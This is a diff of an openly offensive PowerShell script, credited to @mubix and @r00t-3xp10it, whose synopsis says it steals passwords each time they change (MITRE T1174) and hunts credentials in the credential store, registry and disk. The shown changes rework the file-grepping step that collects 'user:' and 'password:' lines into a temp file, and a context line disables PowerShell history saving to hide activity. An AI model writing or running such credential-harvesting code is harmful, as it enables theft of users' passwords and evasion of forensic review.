@@ -1,8 +1,13 @@
 ﻿<#
 .SYNOPSIS
+   Stealing passwords every time they change {mitre T1174}
+   Search for creds in diferent locations {store|regedit|disk}
+
    Author: @mubix|@r00t-3xp10it
-   Helper - Stealing passwords every time they change {mitre T1174}
-   Helper - Search for creds in diferent locations {store|regedit|disk}
+   Tested Under: Windows 10 (18363) x64 bits
+   Required Dependencies: none
+   Optional Dependencies: none
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
@@ -117,12 +122,12 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
          
            ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
               Get-Content -Path "$Item" -EA SilentlyContinue -Force|
-              Select-String -Pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:" >> $Env:TMP\passwd.txt
+              findstr /C:"user:" /C:"pass:" /C:"username:" /C:"pwd:" /C:"passw:" /C:"password:" /C:"login:" /C:"logon:" >> $Env:TMP\passwd.txt
            }
 
            $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue|
-               Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"|
-               findstr /V "S E R V I C E"|findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
+               findstr /C:"user:" /C:"pass:" /C:"username:" /C:"pwd:" /C:"passw:" /C:"password:" /C:"login:" /C:"logon:"|
+               findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
            If($ChekCreds -ieq $null){## None credentials found
               Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
            }Else{## Credentials found
